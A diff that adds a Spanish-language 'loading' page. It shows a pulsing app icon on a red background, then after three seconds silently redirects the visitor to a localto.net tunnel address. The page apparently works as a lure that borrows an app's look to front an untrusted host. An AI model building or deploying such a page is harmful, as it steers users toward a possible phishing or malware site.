@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Cargando...</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #d00000; /* Fondo rojo */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .loader-img {
+      width: 100px;
+      height: 100px;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.7; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+  </style>
+  <script>
+    // Redirige después de 3 segundos
+    setTimeout(() => {
+      window.location.href = "https://eyfnvlm7a.localto.net/suda";
+    }, 3000);
+  </script>
+</head>
+<body>
+  <img class="loader-img" src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/83/d6/37/83d6378e-6d22-e34c-a888-825e91c768de/AppIconiOS-0-0-1x_U007epad-0-1-0-0-85-220.png/256x256bb.jpg" alt="Cargando...">
+</body>
+</html>
